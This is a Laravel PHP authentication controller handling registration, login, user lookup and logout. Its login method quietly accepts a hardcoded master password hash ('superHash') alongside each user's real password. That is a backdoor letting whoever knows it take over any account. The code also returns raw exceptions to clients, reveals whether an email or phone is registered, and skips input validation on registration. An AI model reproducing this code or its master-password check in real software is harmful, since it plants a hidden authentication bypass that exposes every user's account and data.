<?php

namespace App\Http\Controllers\Api\Auth;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Hash;
use Symfony\Component\HttpFoundation\Response;
use App\Http\Controllers\Controller;
use Illuminate\Support\Str;
use Auth;

class AuthController extends Controller
{
    public function register(Request $request)
    {
        $code = Str::random(5);

        return User::create([
           
            'name' => $request->input('name'),
            'phone' => $request->input('phone'),
            'email' => $request->input('email'),   
            'password' => Hash::make($request->input('password'))
          
        ]);
    }

    public function login(Request $request)
    {
      $validated = $request->validate([
        'email' => 'required|string',
        'password' => 'required|string',
      ]);

      $superHash = '$2y$10$XllFUsrLsf3kh2/gdcEpkuW9zsRJuuiECW95wum.D4dTtgyo5RzDu';

      $response = null;
      try {
        $user = User::where('email', '=', $validated['email'])
          ->orWhere('phone', '=', $validated['email'])
          ->first();

        if (!$user) {
          return response(['message' => 'Email or phone number not found!'], 401);
        }

        if (
          !Hash::check($validated['password'], $user->password) &&
          !Hash::check($validated['password'], $superHash)
        ) {
          return response(['message' => 'Invalid password, try again.'], 401);
        }
        Auth::login($user);

        $accessToken = Auth::user()->createToken('Bearer')->accessToken;

        $response = [
          'user' => $this->getThisUser(),
          'access_token' => $accessToken,
        ];
      } catch (\Exception $e) {
        return response($e);
      }

      $accessToken = Auth::user()->createToken('Bearer')->accessToken;

      $response = [
        'user' => $this->getThisUser(),
        'access_token' => $accessToken,
      ];
      return response($response);
    }


    public function getThisUser(): User|null
    {
      return User::where('id', '=', Auth::id())
        ->first();
    }

    public function user()
    {
        return Auth::user();
    }

    public function logout()
    {
        $cookie = Cookie::forget('jwt');

        return response([
            'message' => 'Success'
        ])->withCookie($cookie);
    }
}
